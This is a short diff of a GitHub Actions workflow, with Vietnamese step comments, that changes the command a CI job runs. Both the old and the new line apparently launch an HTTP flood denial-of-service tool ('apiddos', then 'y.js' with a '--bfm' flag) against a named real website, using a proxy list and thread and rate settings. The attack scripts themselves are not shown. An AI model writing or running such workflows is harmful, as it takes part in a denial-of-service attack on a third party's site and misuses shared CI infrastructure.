@@ -37,5 +37,5 @@ jobs:
 
       # Chạy file với hệ số
       - name: Chạy Tool
-        run: node apiddos GET https://bussgaming.net 300 4 32 proxy.txt
+        run: node y.js https://bussgaming.net 500 4 32 --bfm proxy.txt
         
